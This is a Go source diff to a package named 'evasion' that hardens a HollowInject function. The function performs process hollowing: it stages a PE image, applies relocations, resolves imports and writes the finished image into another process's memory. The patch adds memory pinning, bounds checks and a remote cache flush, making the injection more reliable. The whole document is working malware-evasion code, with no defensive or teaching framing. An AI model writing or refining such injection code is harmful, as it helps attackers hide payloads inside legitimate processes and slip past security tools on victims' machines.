@@ -21,6 +21,7 @@ package evasion
 import (
 	"encoding/binary"
 	"fmt"
+	"runtime"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -85,8 +86,14 @@ func HollowInject(blob []byte, hostExe string) error {
 	// Copy headers + sections into a local buffer, apply base relocations, and
 	// resolve IAT — all relative to newBase.  Then write the finished image to
 	// the target in a single NtWriteVirtualMemory call.
+	//
+	// Pin staged[0] with runtime.Pinner so the GC cannot move the slice backing
+	// array while we hold a raw uintptr into it (stagedBase).
 	staged := make([]byte, imgSize)
-	if int(hdrSize) <= len(blob) {
+	var pinner runtime.Pinner
+	pinner.Pin(&staged[0])
+	defer pinner.Unpin()
+	if int(hdrSize) <= len(blob) && int(hdrSize) <= len(staged) {
 		copy(staged[:hdrSize], blob[:hdrSize])
 	}
 	for i := 0; i < numSections; i++ {
@@ -117,7 +124,7 @@ func HollowInject(blob []byte, hostExe string) error {
 		if relocRVA != 0 && relocSize != 0 {
 			delta := int64(newBase) - int64(prefBase)
 			if delta != 0 {
-				applyRelocations(stagedBase, uintptr(relocRVA), uintptr(relocSize), delta)
+				applyRelocations(stagedBase, uintptr(relocRVA), uintptr(relocSize), uintptr(imgSize), delta)
 			}
 		}
 	}
@@ -128,7 +135,7 @@ func HollowInject(blob []byte, hostExe string) error {
 		importRVA := binary.LittleEndian.Uint32(blob[optBase+importOff:])
 		importSize := binary.LittleEndian.Uint32(blob[optBase+importOff+4:])
 		if importRVA != 0 && importSize != 0 {
-			if err := resolveImports(stagedBase, uintptr(importRVA), uintptr(importSize)); err != nil {
+			if err := resolveImports(stagedBase, uintptr(importRVA), uintptr(importSize), uintptr(imgSize)); err != nil {
 				return fmt.Errorf("hollow: imports: %w", err)
 			}
 		}
@@ -138,6 +145,7 @@ func HollowInject(blob []byte, hostExe string) error {
 	if !NtWriteRemote(proc, newBase, staged) {
 		return fmt.Errorf("hollow: NtWriteRemote failed")
 	}
+	NtFlushRemote(proc, newBase, uintptr(imgSize))
 
 	// Set per-section protections in target.
 	for i := 0; i < numSections; i++ {
